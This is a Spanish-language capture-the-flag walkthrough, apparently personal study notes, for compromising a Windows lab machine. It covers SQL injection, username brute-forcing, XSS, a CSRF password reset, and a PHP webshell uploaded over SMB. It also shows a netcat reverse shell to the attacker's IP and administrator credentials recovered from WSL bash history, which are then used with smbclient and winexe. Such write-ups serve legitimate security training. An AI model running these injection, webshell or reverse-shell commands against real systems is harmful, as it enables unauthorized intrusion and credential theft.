Haremos el reconocimiento con nmap como siempre, donde encontramos el puerto 80, 445 y 8808:
![[Mis apuntes/ANEXOS/Pasted image 20230210125701.png]]
Como vemos que tiene abierto el puerto 445 y es una máquina Windows, podemos inspeccionarlo con crackmapexec y vemos que se trata de un Windows 10 Enterprise: [[Crackmapexec#Detectar dominio y hostname con crackmapexec]]
![[Mis apuntes/ANEXOS/Pasted image 20230210125936.png]]
Y ahora con smbclient probamos en listar recursos compartidos haciendo uso de un null session, pero no encuentra nada:
![[Mis apuntes/ANEXOS/Pasted image 20230210130019.png]]
En cuanto al puerto 80, vamos a ver con whatweb las características de la web:
![[Mis apuntes/ANEXOS/Pasted image 20230210130914.png]]
Ahora vamos a acceder a la web:
![[Mis apuntes/ANEXOS/Pasted image 20230210131345.png]]
Y si probamos en registrarnos como el usuario 'or 1=1-- - veremos que esta web es vulnerable a una SQL injection:
![[Mis apuntes/ANEXOS/Pasted image 20230213120456.png]]
Iniciamos sesión con el usuario 'or 1=1-- - y accedemos a todas las notas:
![[Mis apuntes/ANEXOS/Pasted image 20230213120525.png]]
Pero vamos a hacerlo de otra forma para aprender, ya que también podemos hacer un ataque de diccionario con wfuzz para probar muchos posibles usuarios dentro de un panel de login, por ejemplo en una web donde si pongo un usuario, me dice si existe o no en el sistema como en este caso:
![[Mis apuntes/ANEXOS/Pasted image 20230210132724.png]]
Por tanto yo puedo probar con muchos usuarios a ver si en alguno me dice que sí existe este usuario, por lo que primero obtendremos el diccionario donde figuran muchos posibles usuarios:
![[Mis apuntes/ANEXOS/Pasted image 20230210132919.png]]
Por tanto utilizando este diccionario, con WFUZZ podemos hacer estas comprobación de esta forma:[[Wfuzz]]
![[Mis apuntes/ANEXOS/Pasted image 20230210133127.png]]
Pero así lo que ocurre es que me muestra cada uno de los intentos:
![[Mis apuntes/ANEXOS/Pasted image 20230210133435.png]]
Por lo que con wfuzz, podemos decir que siempre y cuando el mensaje de error de la web sea el mismo, que no lo muestre; y que sólo nos muestre el usuario que genera un mensaje diferente en la web; usando el parámetro --hs: [[Wfuzz#FUERZA BRUTA PANEL DE LOGIN CON WFUZZ]]
![[Mis apuntes/ANEXOS/Pasted image 20230210133523.png]]
Y nos encuentra el usuario Tyler:
![[Mis apuntes/ANEXOS/Pasted image 20230210133537.png]]
Y ahora si probamos en poner el usuario Tyler vemos que nos muestra que sí existe:
![[Mis apuntes/ANEXOS/Pasted image 20230210133919.png]]
No obstante en esta web vamos a probar en registrarnos y en acceder:
![[Mis apuntes/ANEXOS/Pasted image 20230210134040.png]]
Por tanto vamos a probar en crear una nota:
![[Mis apuntes/ANEXOS/Pasted image 20230210134124.png]]
Y al crear la nota vamos a probar en ver si esta web es vulnerable a cross site scripting (XSS):
![[Mis apuntes/ANEXOS/Pasted image 20230210134212.png]]
Y vemos que al guardar la nota se nos genera una ventana, indicando que esta web es vulnerable a XSS ya que nos ejecutó el código que inyectamos:
![[Mis apuntes/ANEXOS/Pasted image 20230210134249.png]]
También podríamos verlo con una etiqueta HTML:
![[Mis apuntes/ANEXOS/Pasted image 20230210134348.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230210134358.png]]
En este punto lo que podemos hacer es cambiar la contraseña del usuario Tyler aprovechándonos de la vulnerabilidad CSRF (Cross-site request forgery); y para ello debemos ver cómo se tramita la petición donde se puede cambiar la contraseña, por lo que vamos al menú de cambiar contraseña:
![[Mis apuntes/ANEXOS/Pasted image 20230213120811.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230213103425.png]]
Interceptamos este cambio de contraseña con burp suite para ver cómo se tramita la petición:
![[Mis apuntes/ANEXOS/Pasted image 20230213103456.png]]
Y para poder ver la petición donde cambiamos la contraseña en texto plano, cambiaremos esta petición a GET:
![[Mis apuntes/ANEXOS/Pasted image 20230213103536.png]]
Y ahora ya vemos la petición con las credenciales:
![[Mis apuntes/ANEXOS/Pasted image 20230213103612.png]]
Enviamos la petición dentro de la barra de navegación y vemos que se cambia la contraseña de nuestro usuario
![[Mis apuntes/ANEXOS/Pasted image 20230213103933.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230213103840.png]]
Por tanto vemos que esta dirección es la que cambia una contraseña:
![[Mis apuntes/ANEXOS/Pasted image 20230213103809.png]]
Llegados a este punto, si conseguimos que el usuario Tyler ejecute esta dirección, podremos cambiarle su contraseña, por lo que lo haremos dentro de la parte de contact us:
![[Mis apuntes/ANEXOS/Pasted image 20230213104030.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230213104101.png]]
Y ahora si el usuario Tyler le hubiera hecho clic en ese enlace, se le habría cambiado su contraseña por la de 123123, por tanto vamos a probar en iniciar sesión con el usuario Tyler y con esta credencial, donde veremos que ha funcionado:
![[Mis apuntes/ANEXOS/Pasted image 20230213104225.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230213104236.png]]
Y en esta parte vemos una contraseña:
![[Mis apuntes/ANEXOS/Pasted image 20230213104422.png]]
Ya tenemos el usuario Tyler y la contraseña, por lo que vamos a validar que sean correctas con crakmapexec:
![[Mis apuntes/ANEXOS/Pasted image 20230213104729.png]]
Y con smbmap veremos los recursos compartidos a nivel de red:
![[Mis apuntes/ANEXOS/Pasted image 20230213104857.png]]
No obstante, con smbclient también podemos acceder al interior de un recurso compartido, por ejemplo de new-site, donde tenemos permisos de lectura y escritura: [[SMBclient#EJECUTAR COMANDOS CON SMBCLIENT]]
```bash
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
```
![[Mis apuntes/ANEXOS/Pasted image 20230213105508.png]]
Y en este recurso compartido vamos primero a subir un código php malicioso, ya que la máquina vemos que funciona con php:[[0 - Consideraciones Previas#Código PHP malicioso para ganar Reverse Shell]]
![[Mis apuntes/ANEXOS/Pasted image 20230213110730.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230213110749.png]]
Y ahora, dentro del puerto 8808, donde vemos que funciona con IIS (ya que lo vimos en el reporte de nmap), podemos intuir que si por este puerto intentamos acceder al cmd de php que acabamos de subir, tendremos ejecución remota de comandos:
![[Mis apuntes/ANEXOS/Pasted image 20230213111331.png]]
Ahora vamos a compartir el binario de netcat y nos ganamos la reverse shell:
![[Mis apuntes/ANEXOS/Pasted image 20230213111746.png]]
Y ahora con burpsuite podemos urlencodear el comando curl para que se baje el binario de netcat:
![[Mis apuntes/ANEXOS/Pasted image 20230213111951.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230213112004.png]]
Compartimos el nv64.exe con la víctima:
![[Pasted image 20240127100712.png]]
Ahora que está todo listo, nos ponemos en escucha con netcat:
![[Mis apuntes/ANEXOS/Pasted image 20230213112057.png]]
Y desde el navegador, ejecutamos el comando donde llamamos al binario de netcat y nos enviamos la reverse shell por el puerto 443:
```bash
http://10.10.10.97:8808/cmd.php?cmd=nc64.exe 10.10.16.10 443 -e cmd.exe
```
![[Mis apuntes/ANEXOS/Pasted image 20230213112411.png]]
![[Pasted image 20240127100930.png]]
Y dentro del directorio de Tyler ya encontramos la flag de user.txt:
![[Mis apuntes/ANEXOS/Pasted image 20230213112544.png]]
Y dentro de la carpeta de Tyler vemos un acceso directo a un bash:
![[Mis apuntes/ANEXOS/Pasted image 20230213112921.png]]
Si hacemos un type para ver el contenido del fichero, vemos algo de bash.exe:
![[Pasted image 20240127101027.png]]
Pero dentro de esto, nos encontramos con una ruta donde se encuentra un ejecutable de bash.exe, lo que nos hace pensar que en este sistema corre un subsistema de linux:
![[Mis apuntes/ANEXOS/Pasted image 20230213113425.png]]
Por tanto vamos a ejecutar esto y nos devuelve una consola de Linux como root:
![[Pasted image 20240127101121.png]]
Adquirimos un prompt:
![[Mis apuntes/ANEXOS/Pasted image 20230213113543.png]]
En este subsistema, nos encontramos con el histórico de bash con el archivo .bash_history:
![[Mis apuntes/ANEXOS/Pasted image 20230213113804.png]]
Por lo que vamos a inspeccionarlo para ver los comandos que se ejecutaron en esta parte, donde nos encontramos con las credenciales del usuario administrador:
![[Pasted image 20240127101157.png]]
Por tanto ahora ejecutamos ese comando de smbclient con las credenciales del usuario administrador:
```bash
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```
![[Pasted image 20240127101241.png]]
Y vamos al directorio del usuario Administrator y descargamos la flag de root con el comando get root.txt:
![[Pasted image 20240127101406.png]]
Y ahora en nuestra máquina local ya tenemos la flag de root:
![[Pasted image 20240127101327.png]]
Y ahora si queremos entrar dentro de la máquina usando una shell, tenemos que usar winexe, pudiéndonos conectar a la máquina víctima mediante SMB:
```bash
winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
```
![[Pasted image 20240127102015.png]]